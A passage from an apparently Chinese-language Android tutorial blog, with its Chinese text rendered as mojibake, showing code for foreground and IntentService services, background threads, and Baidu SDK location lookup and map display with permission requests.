class="keyword">int</span> <span class="title">getProgress</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;getProgress: &quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mBinder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequiresApi(api = Build.VERSION_CODES.O)</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onCreate: &quot;</span>);</span><br><span class="line">        <span class="comment">//è°ƒç”¨å¯åŠ¨å‰å°å‡½æ•°</span></span><br><span class="line">        setForegroundService();<span class="comment">//ä¿®æ”¹ç‚¹</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span> </span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onStartCommand: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onDestroy: &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--Manifest.xml åˆ«å¿˜äº†å¢åŠ å‰å°é€šçŸ¥çš„æƒé™ï¼Œå› ä¸ºä¸å±äºå±é™©æƒé™åªéœ€å£°æ˜ï¼Œæ— éœ€è¿è¡Œæ—¶æƒé™--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.FOREGROUND_SERVICE&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="å®‰å“å¤šçº¿ç¨‹"><a href="#å®‰å“å¤šçº¿ç¨‹" class="headerlink" title="å®‰å“å¤šçº¿ç¨‹"></a>å®‰å“å¤šçº¿ç¨‹</h3><p>æœåŠ¡ä¸­çš„ä»£ç éƒ½æ˜¯é»˜è®¤è¿è¡Œåœ¨ä¸»çº¿ç¨‹å½“ä¸­çš„ï¼Œå¦‚æœç›´æ¥åœ¨æœåŠ¡é‡Œå»å¤„ç†ä¸€äº›è€—æ—¶çš„é€»è¾‘ï¼Œå°±å¾ˆå®¹æ˜“å‡ºç°ANRï¼ˆApplication Not Respondingï¼‰çš„æƒ…å†µã€‚</p>
<p>æ‰€ä»¥è¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°Androidå¤šçº¿ç¨‹ç¼–ç¨‹çš„æŠ€æœ¯äº†ï¼Œæˆ‘ä»¬åº”è¯¥åœ¨æœåŠ¡çš„æ¯ä¸ªå…·ä½“çš„æ–¹æ³•é‡Œå¼€å¯ä¸€ä¸ªå­çº¿ç¨‹ï¼Œç„¶ååœ¨è¿™é‡Œå»å¤„ç†é‚£äº›è€—æ—¶çš„é€»è¾‘ã€‚å› æ­¤ï¼Œä¸€ä¸ªæ¯”è¾ƒæ ‡å‡†çš„æœåŠ¡å°±å¯ä»¥å†™æˆå¦‚ä¸‹å½¢å¼ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;  </span><br><span class="line">            <span class="meta">@Override</span>  </span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">                <span class="comment">// å¤„ç†å…·ä½“çš„é€»è¾‘</span></span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ï¼Œè¿™ç§æœåŠ¡ä¸€æ—¦å¯åŠ¨ä¹‹åï¼Œå°±ä¼šä¸€ç›´å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œå¿…é¡»è°ƒç”¨<code>stopService()</code> æˆ–è€…<code>stopSelf()</code> æ–¹æ³•æ‰èƒ½è®©æœåŠ¡åœæ­¢ä¸‹æ¥ã€‚æ‰€ä»¥ï¼Œå¦‚æœæƒ³è¦å®ç°è®©ä¸€ä¸ªæœåŠ¡åœ¨æ‰§è¡Œå®Œæ¯•åè‡ªåŠ¨åœæ­¢çš„åŠŸèƒ½ï¼Œå°±å¯ä»¥è¿™æ ·å†™ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// å¤„ç†å…·ä½“çš„é€»è¾‘</span></span><br><span class="line">                stopSelf();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ä½¿ç”¨IntentSeviceæ¥ç®¡ç†çº¿ç¨‹"><a href="#ä½¿ç”¨IntentSeviceæ¥ç®¡ç†çº¿ç¨‹" class="headerlink" title="ä½¿ç”¨IntentSeviceæ¥ç®¡ç†çº¿ç¨‹"></a>ä½¿ç”¨IntentSeviceæ¥ç®¡ç†çº¿ç¨‹</h3><p>è‡ªåŠ¨å¼€å¯å’Œå…³é—­çº¿ç¨‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MainActivity,æ·»åŠ ä¸€ä¸ªcase,ç‚¹å‡»æŒ‰é’®</span></span><br><span class="line">Intent intentService = <span class="keyword">new</span> Intent(<span class="keyword">this</span>,MyIntentService.class);</span><br><span class="line">                startService(intentService);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ–°å»ºä¸€ä¸ªç±»ç»§æ‰¿è‡ªIntentService</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyIntentService</span> <span class="keyword">extends</span> <span class="title">IntentService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyIntentService</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(<span class="string">&quot;MyIntentService&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onHandleIntent</span><span class="params">(<span class="meta">@Nullable</span> Intent intent)</span> </span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;MyIntentService&quot;</span>, <span class="string">&quot;Thread id is &quot;</span>+Thread.currentThread().getId());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        Log.d(<span class="string">&quot;MyIntentService&quot;</span>, <span class="string">&quot;onDestroy executed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h2 id="ç™¾åº¦å®šä½SDK"><a href="#ç™¾åº¦å®šä½SDK" class="headerlink" title="ç™¾åº¦å®šä½SDK"></a>ç™¾åº¦å®šä½SDK</h2><h4 id="è·å–ç»çº¬åº¦ä¿¡æ¯ï¼Œåœ°å€æè¿°"><a href="#è·å–ç»çº¬åº¦ä¿¡æ¯ï¼Œåœ°å€æè¿°" class="headerlink" title="è·å–ç»çº¬åº¦ä¿¡æ¯ï¼Œåœ°å€æè¿°"></a>è·å–ç»çº¬åº¦ä¿¡æ¯ï¼Œåœ°å€æè¿°</h4><p><strong>å¯¼å…¥ç¬¬ä¸‰æ–¹jaråŒ…æ”¾åœ¨/app/libsç›®å½•åéœ€è¦å³é”®é¼ æ ‡add as library..</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MainActivity</span></span><br><span class="line">    <span class="keyword">public</span> LocationClient mLocationClient;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TextView positionText;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line"><span class="comment">//          å£°æ˜LocationClientç±»</span></span><br><span class="line">        mLocationClient = <span class="keyword">new</span> LocationClient(getApplicationContext());</span><br><span class="line"><span class="comment">//        æ³¨å†Œç›‘å¬å‡½æ•°</span></span><br><span class="line">        mLocationClient.registerLocationListener(<span class="keyword">new</span> MyLocationListener());</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        positionText = (TextView) findViewById(R.id.position_text_view);</span><br><span class="line">        List&lt;String&gt; permissionList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="comment">//        ç”³è¯·æƒé™ï¼Œè®¿é—®ä½ç½®</span></span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">                permission.ACCESS_FINE_LOCATION)!= PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            permissionList.add(Manifest.permission.ACCESS_FINE_LOCATION);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        ç”³è¯·æƒé™ï¼Œè¯»å–æ‰‹æœºçŠ¶æ€</span></span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">                permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            permissionList.add(Manifest.permission.READ_PHONE_STATE);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        ç”³è¯·æƒé™ï¼Œå†™å­˜å‚¨</span></span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">                permission.WRITE_EXTERNAL_STORAGE)!= PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            permissionList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!permissionList.isEmpty()) &#123;</span><br><span class="line">            String [] permissions = permissionList.toArray(<span class="keyword">new</span> String[permissionList.</span><br><span class="line">                    size()]);</span><br><span class="line">            ActivityCompat.requestPermissions(MainActivity.<span class="keyword">this</span>, permissions, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            requestLocation();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="meta">@NonNull</span> String[] permissions, <span class="meta">@NonNull</span> <span class="keyword">int</span>[] grantResults)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (requestCode) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> (grantResults.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> result : grantResults) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (result != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">                            Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;å¿…é¡»åŒæ„æ‰€æœ‰æƒé™æ‰èƒ½ä½¿ç”¨æœ¬ç¨‹åº&quot;</span>,</span><br><span class="line">                                    Toast.LENGTH_SHORT).show();</span><br><span class="line">                            finish();</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    requestLocation();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;å‘ç”ŸæœªçŸ¥é”™è¯¯&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                    finish();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initLocation</span><span class="params">()</span></span>&#123;</span><br><span class="line">        LocationClientOption option = <span class="keyword">new</span> LocationClientOption();</span><br><span class="line"><span class="comment">//        æ¯éš”äº”ç§’åˆ·æ–°å®šä½</span></span><br><span class="line">        option.setScanSpan(<span class="number">5000</span>);</span><br><span class="line"><span class="comment">//        å¼ºåˆ¶ä½¿ç”¨gpså®šä½</span></span><br><span class="line"><span class="comment">//        option.setLocationMode(LocationClientOption.LocationMode.Device_Sensors);</span></span><br><span class="line">        option.setIsNeedAddress(<span class="keyword">true</span>);</span><br><span class="line">        mLocationClient.setLocOption(option);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">requestLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        initLocation();</span><br><span class="line"><span class="comment">//        è°ƒç”¨LocationClientçš„start()æ–¹æ³•ï¼Œä¾¿å¯å‘èµ·å®šä½è¯·æ±‚</span></span><br><span class="line">        mLocationClient.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//    baidu sdk v7.2èµ·çš„æ–°è°ƒç”¨æ¥å£ï¼Œå¼‚æ­¥å®ç°ï¼Œè¿™é‡Œæˆ‘æ”¹äº†åŸä½œè€…çš„ä»£ç ï¼Œå› ä¸ºè™½ç„¶è¿˜èƒ½ç”¨ä½†ç™¾åº¦å®˜æ–¹æ–‡æ¡£æ¨èä½¿ç”¨æ­¤æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLocationListener</span> <span class="keyword">extends</span> <span class="title">BDAbstractLocationListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceiveLocation</span><span class="params">(BDLocation location)</span> </span>&#123;</span><br><span class="line">            runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    StringBuilder currentPosition = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;çº¬åº¦ï¼š&quot;</span>).append(location.getLatitude()).</span><br><span class="line">                            append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;ç»çº¿ï¼š&quot;</span>).append(location.getLongitude()).</span><br><span class="line">                            append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;å›½å®¶ï¼š&quot;</span>).append(location.getCountry()).</span><br><span class="line">                            append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;çœï¼š&quot;</span>).append(location.getProvince()).</span><br><span class="line">                            append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;å¸‚ï¼š&quot;</span>).append(location.getCity()).</span><br><span class="line">                            append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;åŒºï¼š&quot;</span>).append(location.getDistrict()).</span><br><span class="line">                            append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;è¡—é“ï¼š&quot;</span>).append(location.getStreet()).</span><br><span class="line">                            append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;å®šä½æ–¹å¼ï¼š&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (location.getLocType() == BDLocation.TypeGpsLocation) &#123;</span><br><span class="line">                        currentPosition.append(<span class="string">&quot;GPS&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (location.getLocType() ==</span><br><span class="line">                            BDLocation.TypeNetWorkLocation) &#123;</span><br><span class="line">                        currentPosition.append(<span class="string">&quot;ç½‘ç»œ&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    positionText.setText(currentPosition);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//        æ¯äº”ç§’åˆ·æ–°ä¼šéå¸¸çš„è€—ç”µï¼Œæ‰€ä»¥åœ¨ç¨‹åºè¿è¡Œç»“æŸååœæ­¢å®šä½</span></span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        mLocationClient.stop();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">    </span><br><span class="line"><span class="comment">&lt;!--sdkæ‰€éœ€æƒé™--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_COARSE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_FINE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CHANGE_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_PHONE_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WAKE_LOCK&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">&quot;com.baidu.location.f&quot;</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:process</span>=<span class="string">&quot;:remote&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="æ˜¾ç¤ºç™¾åº¦åœ°å›¾å¹¶å®šä½åˆ°å½“å‰ä½ç½®"><a href="#æ˜¾ç¤ºç™¾åº¦åœ°å›¾å¹¶å®šä½åˆ°å½“å‰ä½ç½®" class="headerlink" title="æ˜¾ç¤ºç™¾åº¦åœ°å›¾å¹¶å®šä½åˆ°å½“å‰ä½ç½®"></a>æ˜¾ç¤ºç™¾åº¦åœ°å›¾å¹¶å®šä½åˆ°å½“å‰ä½ç½®</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//ã€€ç™¾åº¦å®šä½sdkæ–‡æ¡£ã€€http://lbsyun.baidu.com/index.php?title=android-locsdk/guide/get-location/latlng</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//    ç™¾åº¦åœ°å›¾å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">private</span> BaiduMap baiduMap;</span><br><span class="line"><span class="comment">//    ç”¨äºåœ°å›¾ä¸Šæ˜¾ç¤ºå½“å‰ä½ç½®å°è“ç‚¹çš„åˆå§‹åŒ–å˜é‡</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> isFirstLocate = <span class="keyword">true</span>;</span><br><span class="line"><span class="comment">//    æ˜¾ç¤ºåœ°å›¾ç”¨çš„å˜é‡</span></span><br><span class="line">    <span class="keyword">private</span> MapView mapView;</span><br><span class="line"><span class="comment">//    å®šä½ç”¨çš„å˜é‡</span></span><br><span class="line">    <span class="keyword">public</span> LocationClient mLocationClient;</span><br><span class="line"><span class="comment">//ã€€ã€€å­˜æ”¾å®šä½ä¿¡æ¯çš„ç³»ç»Ÿï¼µï¼© TextView</span></span><br><span class="line"><span class="comment">//    private TextView positionText;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    å®šä½åˆ°å½“å‰ä½ç½®ï¼Œå¹¶ä»¥å°è“ç‚¹æ˜¾ç¤º</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">navigateTo</span><span class="params">(BDLocation location)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isFirstLocate) &#123;</span><br><span class="line">            LatLng ll = <span class="keyword">new</span> LatLng(location.getLatitude(), location.getLongitude());</span><br><span class="line">            MapStatusUpdate update = MapStatusUpdateFactory.newLatLng(ll);</span><br><span class="line">            baiduMap.animateMapStatus(update);</span><br><span class="line">            update = MapStatusUpdateFactory.zoomTo(<span class="number">16f</span>);</span><br><span class="line">            baiduMap.animateMapStatus(update);</span><br><span class="line">            isFirstLocate = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        MyLocationData.Builder locationBuilder = <span class="keyword">new</span> MyLocationData.Builder();</span><br><span class="line">        locationBuilder.latitude(location.getLatitude());</span><br><span class="line">        locationBuilder.longitude(location.getLongitude());</span><br><span class="line">        MyLocationData locationData = locationBuilder.build();</span><br><span class="line">        baiduMap.setMyLocationData(locationData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line"><span class="comment">//          å£°æ˜LocationClientç±»</span></span><br><span class="line">        mLocationClient = <span class="keyword">new</span> LocationClient(getApplicationContext());</span><br><span class="line"><span class="comment">//        æ³¨å†Œç›‘å¬å‡½æ•°</span></span><br><span class="line">        mLocationClient.registerLocationListener(<span class="keyword">new</span> MyLocationListener());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        positionText = (TextView) findViewById(R.id.position_text_view);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    æ˜¾ç¤ºåœ°å›¾</span></span><br><span class="line">        SDKInitializer.initialize(getApplicationContext());</span><br><span class="line"></span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        mapView = (MapView) findViewById(R.id.bmapView) ;</span><br><span class="line"></span><br><span class="line">        baiduMap = mapView.getMap();</span><br><span class="line"></span><br><span class="line">        baiduMap.setMyLocationEnabled(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; permissionList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="comment">//        ç”³è¯·æƒé™ï¼Œè®¿é—®ä½ç½®</span></span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">                permission.ACCESS_FINE_LOCATION)!= PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            permissionList.add(Manifest.permission.ACCESS_FINE_LOCATION);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        ç”³è¯·æƒé™ï¼Œè¯»å–æ‰‹æœºçŠ¶æ€</span></span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">                permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            permissionList.add(Manifest.permission.READ_PHONE_STATE);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        ç”³è¯·æƒé™ï¼Œå†™å­˜å‚¨</span></span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">                permission.WRITE_EXTERNAL_STORAGE)!= PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            permissionList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!permissionList.isEmpty()) &#123;</span><br><span class="line">            String [] permissions = permissionList.toArray(<span class="keyword">new</span> String[permissionList.</span><br><span class="line">                    size()]);</span><br><span class="line">            ActivityCompat.requestPermissions(MainActivity.<span class="keyword">this</span>, permissions, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            requestLocation();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onResume</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onResume();</span><br><span class="line">        mapView.onResume();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span 